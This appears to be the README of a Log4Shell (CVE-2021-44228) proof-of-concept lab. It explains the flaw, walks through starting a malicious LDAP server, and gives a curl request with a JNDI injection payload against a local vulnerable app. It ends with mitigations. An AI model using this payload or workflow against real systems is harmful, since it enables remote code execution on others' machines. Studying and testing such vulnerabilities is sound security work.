Log4Shell CVE-2021-44228
========================

**Author:**    Hyperion Gray Security Team  
**Date:**      2024-12-15  
**CVE:**       [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)  
**Advisory:**  https://www.lunasec.io/docs/blog/log4j-zero-day/  
**Tested on:** Java 8, Log4j 2.14.1 and below  

Discussion
----------

Log4Shell is a critical remote code execution vulnerability in Apache Log4j 2, a widely-used Java logging library. The vulnerability allows attackers to execute arbitrary code by sending specially crafted strings that trigger JNDI lookups.

This exploit demonstrates the vulnerability by:
1. Setting up a malicious LDAP server that serves a Java class
2. Triggering the vulnerable Log4j library to perform a JNDI lookup
3. Executing arbitrary code on the target system

The vulnerability affects Log4j versions 2.0-beta9 through 2.14.1. It was patched in version 2.15.0 (initially) and more completely in 2.17.0.

## Prerequisites

- Python 3.x
- Java 8 or Java 11 (vulnerable versions)
- Required Python packages (see requirements.txt)

## Installation

Install dependencies:

    $ pip install -r requirements.txt

## Usage

### Step 1: Start the malicious LDAP server

In one terminal, start the LDAP server that will serve the malicious payload:

    $ python3 ldap_server.py

This will start an LDAP server on port 1389 and an HTTP server on port 8888 to serve the malicious Java class.

### Step 2: Run the vulnerable application

In another terminal, start the vulnerable Log4j application:

    $ cd vulnerable_app
    $ java -cp ".:log4j-core-2.14.1.jar:log4j-api-2.14.1.jar" VulnerableApp

### Step 3: Trigger the exploit

Send a malicious payload to the vulnerable application:

    $ curl 'http://localhost:8080/hello?name=${jndi:ldap://localhost:1389/Exploit}'

Or use the exploit script:

    $ python3 exploit.py --target localhost --port 8080

### Expected Behavior

When successful, you should see:
1. The LDAP server receives the JNDI lookup request
2. The vulnerable app downloads and executes the malicious class
3. A reverse shell or command execution occurs (depending on payload)

## Security Notice

**This is for educational and authorized penetration testing purposes only.** 
Using this exploit against systems without explicit permission is illegal.

## Mitigation

- Update Log4j to version 2.17.1 or later
- Set the system property `log4j2.formatMsgNoLookups=true`
- Remove the JndiLookup class from the classpath
- Use a Web Application Firewall to block JNDI injection attempts
